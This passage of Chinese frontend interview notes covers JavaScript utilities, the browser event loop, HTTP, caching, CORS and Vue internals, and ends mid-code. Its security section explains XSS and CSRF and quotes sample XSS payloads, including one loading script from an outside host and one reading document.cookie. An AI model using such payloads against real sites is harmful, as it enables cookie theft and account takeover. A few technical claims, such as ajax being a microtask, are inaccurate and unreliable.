    * 如果在函数返回的时候，调用者还不能够得到预期结果，而是需要在将来通过一定的手段得到，那么这个函数就是异步的。
    * 如果函数是异步的，发出调用之后，马上返回，但是不会马上返回预期结果。调用者不必主动等待，当被调用者得到结果之后会通过回调函数主动通知调用者。

### 防抖与节流
#### 防抖 (debounce)
将多次高频操作优化为只在最后一次执行，通常使用的场景是：用户输入，只需再输入完成后做一次输入校验即可
```
function debounce(fn, wait, immediate) {
    let timer = null

    return function() {
        let args = arguments
        let context = this

        if (immediate && !timer) {
            fn.apply(context, args)
        }

        if (timer) clearTimeout(timer)
        timer = setTimeout(() => {
            fn.apply(context, args)
        }, wait)
    }
}

```

#### 节流(throttle)
每隔一段时间后执行一次，也就是降低频率，将高频操作优化成低频操作，通常使用场景: 滚动条事件 或者 resize 事件，通常每隔 100~500 ms执行一次即可
```
function throttle(fn, wait, immediate) {
    let timer = null
    let callNow = immediate
    
    return function() {
        let context = this,
            args = arguments

        if (callNow) {
            fn.apply(context, args)
            callNow = false
        }

        if (!timer) {
            timer = setTimeout(() => {
                fn.apply(context, args)
                timer = null
            }, wait)
        }
    }
}

```

### AST 抽象语法树
将代码逐字母解析成 树状对象 的形式


### babel编译原理
* babylon 将 ES6/ES7 代码解析成 AST
* babel-traverse 对 AST 进行遍历转译，得到新的 AST
* 新 AST 通过 babel-generator 转换成 ES5


### 函数柯里化 
在一个函数中，首先填充几个参数，然后再返回一个新的函数的技术，称为函数的柯里化。通常可用于在不侵入函数的前提下，为函数 预置通用参数，供多次重复调用。
```
const add = function add(x) {
	return function (y) {
		return x + y
	}
}

const add1 = add(1)

add1(2) === 3
add1(20) === 21
```

### Array
#### 数组乱序
```
var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
arr.sort(function () {
    return Math.random() - 0.5;
});
```

#### 数组解析 
[1,[2,3]] --> [1, 2, 3]
```
Array.prototype.flat = function() {
    return this.toString().split(',').map(item => item-0 )
}
```

### Promise
```js
* new Promise直接执行，返回Promise对象
new Promise((resolve,reject)=>{
    if(successed)
    {
        resolve(value); //成功返回结果
    }
    else{
        reject(error);  //失败返回错误信息
    }
}).then((value)=>{
    // 成功的回调函数
},
(error)=>{

})
```

----------------------------------------------------------------
### 跨标签页通讯
#### postMessage 子页面
* 父页面 通过 window.open() 或 iframe标签 打开子页面
* 子页面对象调用 postMessage(msg,targetOrigin)发送消息
    * targetOrigin 表示可以获得**该消息所在的域**也可以设置为"*"，表示任何域名都可取得消息
* 子页面中，通过window.addEventListener("message",(evt)=>{},false)取得消息
    * evt中 data为传递的消息 

#### localStorage 同源
* localstorage是浏览器多个标签共用的存储空间，所以可以用来实现多标签之间的通信(ps：session是会话级的存储空间，每个标签页都是单独的）。
* 直接在window对象上添加监听即可：
* onstorage以及storage事件，针对都是非当前页面对localStorage进行修改时才会触发，当前页面修改localStorage不会触发监听函数。然后就是在对原有的数据的值进行修改时才会触发，比如原本已经有一个key会a值为b的localStorage，你再执行：localStorage.setItem('a', 'b')代码，同样是不会触发监听函数的

```
window.onstorage = (e)=>{}

window.addEventListener('storage',fn);
```
#### 定时器setInterval+cookie 同源 
* document.cookie = 改变cookie的值
* setInterval(getcookie(),100);

#### html5浏览器的新特性SharedWorker 
* 普通的webworker直接使用new Worker()即可创建，这种webworker是当前页面专有的。然后还有种共享worker(SharedWorker)，这种是可以多个标签页、iframe共同使用的。
* SharedWorker可以被多个window共同使用，但必须保证这些标签页都是同源的(相同的协议，主机和端口号)


#### webSocket
在浏览器和服务器之间建立一个不受限的双向通信的通道
WebSocket连接必须由浏览器发起，特点：
1. 建立在 TCP 协议之上，服务器端的实现比较容易。
2. 与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。
3. 数据格式比较轻量，性能开销小，通信高效。
4. 可以发送文本，也可以发送二进制数据。
5. 没有同源限制，客户端可以与任意服务器通信。
6. 协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。


### 浏览器架构
* 用户界面
* 主进程
* 内核
    * 渲染引擎
    * JS引擎
        * 执行栈
    * 事件触发线程
        * 消息队列
            * 微任务
            * 宏任务
    * 网络异步线程
    * 定时器线程


### 浏览器下事件循环(Event Loop)

主线程只会做一件事情，就是从消息队列里面取消息、执行消息，再取消息、再执行。当消息队列为空时，就会等待直到消息队列变成非空。而且主线程只有在将当前的消息执行完成后，才会去取下一个消息。这种机制就叫做事件循环机制，取一个消息并执行的过程叫做一次循环

#### 过程
* 在此次 tick 中选择最先进入宏任务队列的任务(oldest task)，如果有则执行(一次)
* 检查是否存在 Microtasks，如果存在则不停地执行，直至清空 Microtasks Queue
* 更新 render （视图更新）
* 主线程重复执行上述步骤
上述为一轮事件循环

![](./browser-deom1-excute-animate.gif)
#### 宏任务 微任务
* 微任务 microtask(jobs): promise / ajax / Object.observe(该方法已废弃)
* 宏任务 macrotask(task): setTimout / **script（整体代码）** / IO（有太多的东西都可以称之为I/O，点击一次button，上传一个文件，与程序产生交互的这些都可以称之为I/O） / UI Rendering（页面渲染）
    * 宏任务优先级 优先执行冒泡的事件

> 程序的script代码也算宏任务，所以第一次事件循环首先执行的是script代码，再去清空微任务队列


特点
* 一个线程中，事件循环是唯一的，但是任务队列可以拥有多个
* setTimeout/Promise等我们称之为任务源。而进入任务队列的是他们指定的具体执行任务。
* 来自不同任务源的任务会进入到不同的任务队列。其中setTimeout与setInterval是同源的。

[参考](http://lynnelv.github.io/js-event-loop-browser)
### setTimeout setInterval
**第三个参数用来传递第一个函数需要的参数数据**
在等待的时间结束后才将任务提交到任务队列

最好使用setTimeout来模拟setInterval
```js
function alertTime(count) {
var max = 100;


    console.log(count);
    count++;
    if (count < max) {
        setTimeout(alertTime, 1000,count,);
    }
}
setTimeout(alertTime, 1000,1,1);
```

### 从输入 url 到展示的过程
* DNS 解析 域名 -> ip
* TCP 三次握手
* 发送请求，分析 url，设置请求报文(头，主体)
* 服务器返回请求的文件 (html)
* 浏览器渲染
    * HTML parser --> DOM Tree
        * 标记化算法，进行元素状态的标记
        * dom 树构建
    * CSS parser --> Style Tree
        * 解析 css 代码，生成样式树
    * attachment --> Render Tree
        * 结合 dom树 与 style树，生成渲染树
    * layout: 据渲染树来布局，以计算每个节点的几何信息
    * GPU painting: 像素绘制页面 **将各个节点绘制到屏幕上**

### 重绘与回流
当元素的样式发生变化时，浏览器需要触发更新，重新绘制元素。这个过程中，有两种类型的操作，即重绘与回流。

* 重绘(repaint): 当元素**样式**的改变不影响布局时，浏览器将使用重绘对元素进行更新，此时由于只需要**UI层面的重新像素绘制**，因此 损耗较少

* 回流(reflow): 当元素的**尺寸、结构或触发某些属性**时，浏览器会**重新渲染页面**，称为回流。此时，浏览器需要重新经过计算，计算后还需要重新页面布局，因此是较重的操作。会触发回流的操作:
    * 页面初次渲染
    * 浏览器窗口大小改变
    * 元素尺寸、位置、内容发生改变
    * 元素字体大小变化
    * 添加或者删除可见的 dom 元素
    * 激活 CSS 伪类（例如：:hover）
    * 查询某些属性或调用某些方法
        * clientWidth、clientHeight、clientTop、clientLeft
        * offsetWidth、offsetHeight、offsetTop、offsetLeft
        * scrollWidth、scrollHeight、scrollTop、scrollLeft
        * getComputedStyle()
        * getBoundingClientRect()
        * scrollTo()

#### 最佳实践:


* css
    * 避免使用table布局 
    * 将动画效果应用到position属性为absolute或fixed的元素上

* javascript
    * 避免频繁操作样式，可汇总后统一 一次修改
*   * 尽量使用class进行样式修改
    * 减少dom的增删次数，可使用 字符串 或者 documentFragment 一次性插入
    * 极限优化时，修改样式可将其display: none后修改
    * 避免多次触发上面提到的那些会触发回流的方法，可以的话尽量用 变量存住


### 存储
* 短暂性的时候，我们只需要将数据存在内存中，只在运行时可用

* 持久性存储，可以分为 浏览器端 与 服务器端

    * 浏览器:
        * cookie:
            * 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。 通常用于存储用户身份，登录状态等
            * document.cookie = 
            * http 中自动携带， 体积上限为 4K， 可自行设置过期时间
        * localStorage / sessionStorage: 长久储存/窗口关闭删除
            * 体积限制为 4~5M
            * localStorage.setItem(key,value) 存储自动转化为字符串
        * indexDB
    * 服务器:
        * 分布式缓存 redis
        * 数据库

### [Web Worker](http://www.ruanyifeng.com/blog/2018/07/web-worker.html)
现代浏览器为JavaScript创造的 多线程环境。可以新建并将部分任务分配到worker线程并行运行，两个线程可 独立运行，互不干扰，可通过自带的 消息机制 相互通信。

* Worker 线程一旦新建成功，就会始终运行
1. 同源限制

分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。

2. DOM 限制

Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用document、window、parent这些对象。但是，Worker 线程可以navigator对象和location对象。

3. 通信联系

Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。

4. 脚本限制

Worker 线程不能执行alert()方法和confirm()方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。

5. 文件限制

Worker 线程无法读取本地文件，即不能打开本机的文件系统（file://），它所加载的脚本，必须来自网络。

* 主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程

### 内存泄露
* 意外的全局变量: 无法被回收
* 定时器: 未被正确关闭，导致所引用的外部变量无法被释放
* 事件监听: 没有正确销毁 (低版本浏览器可能出现)
* 闭包: 会导致父级中的变量无法被释放
* dom 引用: dom 元素被删除时，内存中的引用未被正确清空

### V8垃圾回收机制 [v8引擎](https://zhuanlan.zhihu.com/p/27628685)
垃圾回收: 将内存中不再使用的数据进行清理，释放出内存空间。V8 将内存分成 新生代空间 和 老生代空间。

* 新生代空间: 用于存活较短的对象

    * 又分成两个空间: from 空间 与 to 空间
    * Scavenge GC算法: 当 from 空间被占满时，启动 GC 算法
        * 存活的对象从 from space 转移到 to space
        * 清空 from space
        * from space 与 to space 互换
        * 完成一次新生代GC

* 老生代空间: 用于存活时间较长的对象

    * 从 新生代空间 转移到 老生代空间 的条件
        * 经历过一次以上 Scavenge GC 的对象
        * 当 to space 体积超过25%
    * 标记清除算法: 标记存活的对象，未被标记的则被释放
        * 增量标记: 小模块标记，在代码执行间隙执，GC 会影响性能
        * 并发标记(最新技术): 不阻塞 js 执行 在 GC 扫描和标记活动对象时，它允许 JavaScript 应用程序继续运行。测试显示
    * 压缩算法: 将内存中清除后导致的碎片化对象往内存堆的一端移动，解决 内存的碎片化

#
## 服务端与网络
### HTTP/HTTPS
* 超文本传输协议HTTP被用于在Web浏览器和网站服务器之间传递信息，HTTP协议以明文方式发送内容，不提供任何方式的数据加密
* HTTPS在HTTP的基础上加入了SSL协议，SSL依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密

用的端口也不一样，前者是80，后者是443

#### HTTP1.0
* **无法复用链接**，完成即断开，重新慢启动和 TCP 3次握手 
    * TCP 连接会随着时间进行自我调谐，起初会限制连接的最大速度，如果数据成功传输，会随着时间的推移提高传输的速度。这种调谐则被称为 TCP 慢启动
    * HTTP 1.0规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，
* head of line blocking: **线头阻塞**，导致请求之间互相影响 第一个请求阻塞后，后面的请求都需要等待

#### HTTP1.1

* **长连接**(默认 keep-alive)，复用。 HTTP 1.1支持持久连接（HTTP/1.1的默认模式使用带流水线的持久连接），在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟
* host 字段指定对应的虚拟站点 同一个IP同一个端口不同的虚拟Web站点
* 新增功能:
    * **断点续传** 要求服务器从文件XXXX字节处开始传送
    * 身份认证
    * 状态管理
    * **cache 缓存**
        * Cache-Control
        * Expires
        * Last-Modified
        * Etag

#### HTTP2.0
* 多路复用。 允许同时通过单一的 HTTP/2 连接发起多重的请求-响应消息 双向数据流
* 二进制分帧层。应用层http和传输层tcp之间 将所有传输的信息分割为更小的消息和帧（frame）,并对它们采用二进制格式的编码
* 首部压缩。压缩http请求报文头部 首部压缩使得整个HTTP数据包小了很多，传输也就会更快
* 服务端推送。 一种在客户端请求之前发送数据的机制。在 HTTP/2 中，服务器可以对客户端的一个请求发送多个响应。浏览器只请求了index.html，但是服务器把index.html、style.css、example.png全部发送给浏览器。这样的话，只需要一轮 HTTP 通信，浏览器就得到了全部资源，提高了性能。

#### HTTPS
较为安全的网络传输协议 需要进行非对称的加解密，且需要三次握手
* 证书(公钥)
* SSL 加密
* 端口 443

### TCP
* 三次握手
    * 第一次握手(SYN=1, seq=x):客户端发送一个 TCP 的 SYN 标志位置1的包，指明客户端打算连接的服务器的端口，以及初始序号 X,保存在包头的序列号(Sequence Number)字段里。发送完毕后，客户端进入 SYN_SEND 状态。
    * 第二次握手(SYN=1, ACK=1, seq=y, ACKnum=x+1):服务器发回确认包(ACK)应答。即 SYN 标志位和 ACK 标志位均为1。服务器端选择自己 ISN 序列号，放到 Seq 域里，同时将确认序号(Acknowledgement Number)设置为客户的 ISN 加1，即X+1。 发送完毕后，服务器端进入 SYN_RCVD 状态。
    * 第三次握手(ACK=1，ACKnum=y+1).客户端再次发送确认包(ACK)，SYN 标志位为0，ACK 标志位为1，并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在数据段放写ISN的+1.发送完毕后，客户端进入 ESTABLISHED 状态，当服务器端接收到这个包时，也进入 ESTABLISHED 状态，TCP 握手结束。
* 四次挥手 断开连接
    * 第一次挥手(FIN=1，seq=x)假设客户端想要关闭连接，客户端发送一个 FIN 标志位置为1的包，表示自己已经没有数据可以发送了，但是仍然可以接受数据。发送完毕后，客户端进入 FIN_WAIT_1 状态。
    * 第二次挥手(ACK=1，ACKnum=x+1)服务器端确认客户端的 FIN 包，发送一个确认包，表明自己接受到了客户端关闭连接的请求，但还没有准备好关闭连接。发送完毕后，服务器端进入 CLOSE_WAIT 状态，客户端接收到这个确认包之后，进入 FIN_WAIT_2 状态，等待服务器端关闭连接。
    * 第三次挥手(FIN=1，seq=y)服务器端准备好关闭连接时，向客户端发送结束连接请求，FIN 置为1。发送完毕后，服务器端进入 LAST_ACK 状态，等待来自客户端的最后一个ACK。
    * 第四次挥手(ACK=1，ACKnum=y+1)客户端接收到来自服务器端的关闭请求，发送一个确认包，并进入 TIME_WAIT状态，等待可能出现的要求重传的 ACK 包。服务器端接收到这个确认包之后，关闭连接，进入 CLOSED 状态。
    * 客户端等待了某个固定时间（两个最大段生命周期，2MSL，2 Maximum Segment Lifetime）之后，没有收到服务器端的 ACK ，认为服务器端已经正常关闭连接，于是自己也关闭连接，进入 CLOSED 状态。
* 滑动窗口: 流量控制 
    * 接收方通过通告发送方自己的窗口大小，从而控制发送方的发送速度，从而达到防止发送方发送速度过快而导致自己被淹没的目的
        * ACK：期望接收到的下一字节的序号  当前的窗口大小
    * 接受窗口
    * 发送窗口
* 拥塞处理
    * 慢开始 连接会随着时间进行自我调谐，起初会限制连接的最大速度，如果数据成功传输，会随着时间的推移提高传输的速度
    * 拥塞避免 一种处理丢失分组的方法 出现超时和接收到重复的确认时使用
    * 快速重传/超时重传 如果发送方发现收到三个连续的重复 ACK，或者超时了还没有收到任何 ACK，就会确认丢包，即5号包遗失了，从而再次发送这个包。通过这种机制，TCP 保证了不会有数据包丢失
    * 快速恢复  丢失的分组通过快速重传过程发送完，并被目的主机接受后，为了快速的恢复到较高的传输速度，就会进入快速恢复阶段

### [缓存](https://juejin.im/entry/5ad86c16f265da505a77dca4)
* 浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识
* 浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中

* 强缓存 
    * Cache-Control/Expires: 浏览器判断缓存是否过期，未过期时，直接使用强缓存
        * Catch-Control（存放多久）
        * Expires(到某个时间为止)
        * Catch-Control优先级高
* 协商缓存
    * 当缓存已经过期时，使用协商缓存。浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程
    * 唯一标识方案: Etag(response 携带) & If-None-Match(request携带，上一次返回的 Etag): 服务器判断资源是否被修改，
    * 最后一次修改时间: Last-Modified(response) & If-Modified-Since (request，上一次返回的Last-Modified)
        * 如果一致，则直接返回 304 通知浏览器使用缓存
        * 如不一致，则服务端返回新的资源
    * Last-Modified 缺点：
        * 周期性修改，但内容未变时，会导致缓存失效
        * 最小粒度只到 s， s 以内的改动无法检测到
    * Etag 的优先级高于 Last-Modified

### cookie
服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。

* `<cookie name> = <cookie value>`
    * name 名称：一个唯一确定cookie的名称，部分大小写，cookie的名字必须是经过URL编码的，一般可以采用某个前缀在加上当前时间的做法，这样的话名称能够确保是唯一的，也比较方便。
    * value 值：存储在cookie中的字符串值，必须经过被URL编码
* 作用域 cookie应该被发送给哪些URL
    * domain 域：对于哪个域是有效的，如果没有设置的话，默认来自设置cookie的那个域，在上诉例子中就是`.Mozilla.org`
    * path 路径：指定域中的那个路径，应该向服务器发送cookie，`/` 表示没有限制
* 失效时间
    * expires 失效时间：表示cookie何时应该被删除的时间戳，这个日期是GMT格式的日期，如果设置是以前的时间，cookie会被立刻删除。上诉cookie的失效时间是Feb,13-Mar-2018 11:47:50。
    * Max-Age
* 安全标志
    * HttpOnly 禁止JavaScript访问cookie，阻止XSS攻击
    * SameSite 服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）
安全标志：指定以后，cookie只有在使用SSL连接的时候才可以发送到服务器。


```js
document.cookie = " name=value; domain=.mozilla.org; expires=Feb, 13-Mar-2018 11:47:50; path=/; security = true"
```
### 常见状态码
1xx：指示信息--表示请求已接收，继续处理

2xx：成功--表示请求已被成功接收、理解、接受

3xx：重定向--要完成请求必须进行更进一步的操作

4xx：客户端错误--请求有语法错误或请求无法实现

5xx：服务器端错误--服务器未能实现合法的请求

* 1xx: 接受，继续处理
* **200: 成功，并返回数据**
* 201: 已创建
* 202: 已接受
* 203: 成功，但未授权
* **204: 成功，无内容**
* 205: 成功，重置内容
* 206: 成功，部分内容
* 301: 永久移动，重定向
* 302: 临时移动，可使用原有URI
* **304: 资源未修改，可使用缓存**
* **305: 需代理访问**
* 400: 请求语法错误
* 401: 要求身份认证
* **403: 拒绝请求**
* **404: 资源不存在**
* **500: 服务器错误**

### GET POST
1. GET把参数包含在URL中，而POST将数据放在BODY中。
2. GET方式提交的数据有长度限制，则POST的数据则可以非常大。
3. POST比GET安全，因为数据在地址栏上不可见。
4. GET 会被历史保存记录，POST中的参数不会被保留
5. GET只能进行url编码，POST支持更多编码类型（请求头中的Content-Type属性表示编码方式）
6. 对参数的数据类型，GET只接受ASCII字符，而POST没有限制
7. GET在浏览器回退时是无害的，而POST会再次提交请求
8. GET能被缓存，而POST不能
9. GET是幂等(请求次数与资源无关)的。幂等性是指一次和多次请求某一个资源应该具有同样的副作用。简单来说意味着对同一URL的多个请求应该返回同样的结果。

GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同


* get: 
    * 缓存、请求长度受限、会被历史保存记录 无副作用(不修改资源)，
    * 发送一个TCP请求 
    * 幂等
* post: 安全、大数据、更多编码类型 发送两个TCP请求 

* 最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数

### AJAX
无需刷新页面也可以获得服务器的数据

JavaScript执行异步网络请求，在现代浏览器上写AJAX主要依靠XMLHttpRequest对象

只能请求同源

1. 创建XHR对象
2. 设置 `readyStateChange` 的回调函数
3. 设置 timeout ontimeout的回调函数，等待响应时间
3. open 打开请求 设置请求方式，url，以及是否异步发送请求
4. send 发送请求，设置 请求主体数据
5. 服务器接收消息并将消息填充到XHR中
    * status http状态码
        * 200 请求成功
        * 304 服务器文件为改变，可以直接使用缓存
    * responseText 响应主体返回的文本
    * responseXML   响应的XML DOM 文档
    * statusText 状态具体信息
    * readyState 请求相应过程
        * 4 请求完成
```js
function success(text) {
    var textarea = document.getElementById('test-response-text');
    textarea.value = text;
}

function fail(code) {
    var textarea = document.getElementById('test-response-text');
    textarea.value = 'Error code: ' + code;
}

var request = new XMLHttpRequest(); // 新建XMLHttpRequest对象

request.onreadystatechange = function () { // 状态发生变化时，函数被回调
    if (request.readyState === 4) { // 成功完成
        // 判断响应结果:
        if (request.status === 200) {
            // 成功，通过responseText拿到响应的文本:
            return success(request.responseText);
        } else {
            // 失败，根据响应码判断失败原因:
            return fail(request.status);
        }
    } else {
        // HTTP请求还在继续...
    }
}

// 发送请求:
request.open('GET', '/api/categories');
request.send();

alert('请求已发送，请等待响应...');
```

### 跨域
同源是指"协议+域名+端口"三者相同
跨域指一个域下的文档或脚本试图去请求另一个域下的资源，我们通常所说的跨域是狭义的，是由浏览器同源策略限制的一类请求场景

#### 图像Ping
* 返回内容通常是 像素图 或 204 
* 只能发送get请求
* 无法访问服务器的响应文本

```js
var img = new Image();
img.onload = function(){
    alert("done");
}
img.src = 'http://localhost:9871/api/jsonp?msg=helloJsonp&callback=jsonpCb';
document.getElementById("d1").appendChild(img);
```

#### JSONP
是 json 的一种"使用模式"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据

通过动态创建script，再请求一个带参网址实现跨域通信

src='http://localhost:9871/api/jsonp?msg=helloJsonp&callback=jsonpCb'
其中？后面为参数 有 
* msg：helloJsonp， 
* callback=jsonCb  
    * callback 为后端定义的接受返回函数名字的属性，主要看后端规定的叫什么名字，不一定要是callback。
    * jsonCb表示后端返回的数据Json的名字，jsonCb({name:"123"});
    * jsonpCb表示前端在接受到数据后执行的回调函数名字

#### CROS
通过使用自定义头部来和服务器沟通，从而决定请求或响应是否成功。

* 简单请求
    * head，post，get 且 
    * 头部信息不超出
        * Accept
        * Accept-Language
        * Content-Language
        * Last-Event-ID
        * Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain

    * 浏览器直接发出CORS请求，在头信息之中，增加一个**Origin**字段 
    * 如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段
        * **Access-Control-Allow-Origin**。该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。
        * Access-Control-Allow-Credentials。该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。
        * Access-Control-Expose-Headers。该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。
* 非简单请求
    * 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求（preflight）。
        * **Access-Control-Request-Method**。该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。
        * Access-Control-Request-Headers。该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。
    * 服务器确认跨域请求，返回
        * **Access-Control-Allow-Methods**。该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次"预检"请求。
        * Access-Control-Allow-Headers。如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在"预检"中请求的字段。
        * Access-Control-Allow-Credentials。该字段与简单请求时的含义相同。
        * Access-Control-Max-Age。该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。
    * 接下来浏览器再次发出请求，和简单请求一样。

#### postMessage
* 页面和其打开的新窗口的数据传递
* 多窗口之间消息传递
* 页面与嵌套的iframe消息传递
    * 表示嵌套的浏览上下文，有效地将另一个HTML页面嵌入到当前页面中。
* 上面三个场景的跨域数据传递

```js
<iframe id="iframe" src="http://www.domain2.com/b.html" style="display:none;"></iframe> 
<script>       
    var iframe = document.getElementById('iframe');
    iframe.onload = function() {
        var data = {
            name: 'aym'
        };
        // 向domain2传送跨域数据
        iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.domain2.com');
            //通过窗口的origin属性来指定哪些窗口能接收到消息事件
    };

    // 接受domain2返回数据
    window.addEventListener('message', function(e) {
        alert('data from domain2 ---> ' + e.data);
    }, false);
</script>

//b.html
<script>
    // 接收domain1的数据
    window.addEventListener('message', function(e) {
        alert('data from domain1 ---> ' + e.data);

        var data = JSON.parse(e.data);
        if (data) {
            data.number = 16;

            // 处理后再发回domain1
            window.parent.postMessage(JSON.stringify(data), 'http://www.domain1.com');
        }
    }, false);
</script>
```

#### nginx反向代理跨域
以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给Internet上请求连接的客户端

* 可以起到保护网站安全的作用，因为任何来自Internet的请求都必须先经过代理服务器。
* 通过缓存静态资源，加速Web请求。
* 实现负载均衡。

### 安全
* [XSS攻击](https://tech.meituan.com/2018/09/27/fe-security.html): 注入恶意代码

    * 分类
        * 存储型XSS 
            * 攻击者将恶意代码提交到目标网站的数据库中。
            * 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器
        * 反射型XSS
            * 攻击者构造出特殊的 URL，其中包含恶意代码。
            * 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。（比如URL中的参数）
        * DOM型XSS
            * 攻击者构造出特殊的 URL，其中包含恶意代码。
            * 用户打开带有恶意代码的 URL。
            * 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
    * 解决
        * 转义页面上的输入内容和输出内容
        * cookie 设置 httpOnly,禁止javascript读取cookie
        * 设置验证码，防止脚本冒充提交危险操作
        

例如：

攻击者发现 `http://weibo.com/pub/star/g/xyyyd` 这个 URL 的内容未经过滤直接输出到 HTML 中。

于是攻击者构建出一个 URL，然后诱导用户去点击：

`http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>`
```js
<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>
```
攻击者发现`http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb` 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。

于是攻击者构建出一个 URL，并引导用户去点击： `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B`

用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：
```js
<script>
getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"+"&t="+"&d=bbbb";return false;</script><script>alert(document.cookie)</script>"+"...
```
用户通过文本框输入的信息来显示在页面上，那么在文本框输入如下内容
`<img src = "abc" onerror = "alert(1)" />`
```

```
#### CSRF: 跨站请求伪造，防护:

简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
* 解决办法
    * 验证HTTP Referer
        * Referer字段记录请求来源地址 检验是否是同一个源
    * 在请求地址中添加takon验证
        *  HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token
        * 服务器现在页面埋入特定标志，在用户请求时带上此标记，来判断请求是否合法
    * 不被第三方网站访问到用户的cookie sameSite标记

        

------------------------

## Vue
### 数据响应

* 在实例化过程中为每个data属性创建dep对象，并为每个属性定义get()和set()方法。
* 为每一个data属性创建watcher对象，首先将Dep.target设置为watcher（Dep为类），再调用其getter()方法，触发了get()方法里的dep.depend()，将watcher添加到dep对象的subs，（储存所有该data属性的watcher），再通过Dep.target，将当前dep添加到watcher中的deps（储存所有该data属性的dep）。总而言之就是建立了data，dep，watcher之间的依赖关系。
* 在数据发生变化时，会调用数据的set()方法，会触发notify()方法，将消息通知该data的dep对象，在dep对象中遍历所有的与dep绑定的watcher，触发他们的update()方法，来更新dom。

### virtual-dom 虚拟节点树
用js实现一个节点树，在发生改变的时候，通过比较新的树和旧的树的变化，就可以记录下变化，然后应用到真实的dom树上，这样就不用重新渲染整个dom树了。

#### 视图渲染
用js对象来表示dom节点
```js
//声明一个Element对象
function Element(tagName, props, children) {
    this.tagName = tagName
    this.props = props
    this.children = children
}

//创建一个ul实例
var ul = new Element('ul', {id: 'list'}, [
    {tagName: 'li', props: {class: 'item'}, children: ["Item 1"]},
    {tagName: 'li', props: {class: 'item'}, children: ["Item 2"]},
    {tagName: 'li', props: {class: 'item'}, children: ["Item 3"]}
])

```
将JavaScript构建的DOM树渲染到真实的DOM树上
```
//在Element中写上通用的方法
Element.prototype.render = function() {
    let el = document.createElement(this.tagName), // 节点名称
        props = this.props // 节点属性

